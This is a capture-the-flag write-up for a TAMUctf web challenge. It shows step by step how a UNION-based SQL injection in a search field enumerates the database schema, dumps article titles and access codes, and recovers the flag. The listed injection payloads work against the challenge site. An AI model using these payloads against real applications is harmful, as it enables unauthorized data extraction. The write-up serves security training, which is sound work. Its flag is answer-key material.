# Lost and Forgotten
Category: Web

## Description
Author: `Mr. Blade`

I seem to have forgotten the password to my most recent writeup. I wonder if there is any way to recover it.

[http://lost-and-forgotten.tamuctf.com/](http://lost-and-forgotten.tamuctf.com/)

## Write-up
- The search functionality is vulnerable to SQL blind injection. By injecting SQL code into the search input, we can retrieve information from the database.
- Injecting `a' UNION SELECT 1,1,1,1,1,'1';#` reveals a post with title 1, description 1, and so on.
- We can start to leak information about the database by executing specific SQL queries.
- To leak table names, we used `a' UNION SELECT table_name,1,1,1,1,'1' FROM INFORMATION_SCHEMA.TABLES;#`. It revealed an `articles` table.
- The query `a' UNION SELECT column_name,1,1,1,1,'1' FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'articles';#` reveals the column names in the `articles` table such as `title` and `access_code`.
- To retrieve all articles with their titles and access codes, we used `a' UNION SELECT title,access_code,1,1,1,'1' FROM articles;#`.
- We can observe the `access_code` `ba65ba9416d8e53c5d02006b2962d27e` corresponded to the latest write-up post.
- Providing this `access_code` grants access to the write-up post, where it displayed the flag.

Flag: `tamuctf{st4te_0f_th3_UNION_1njecti0n}`
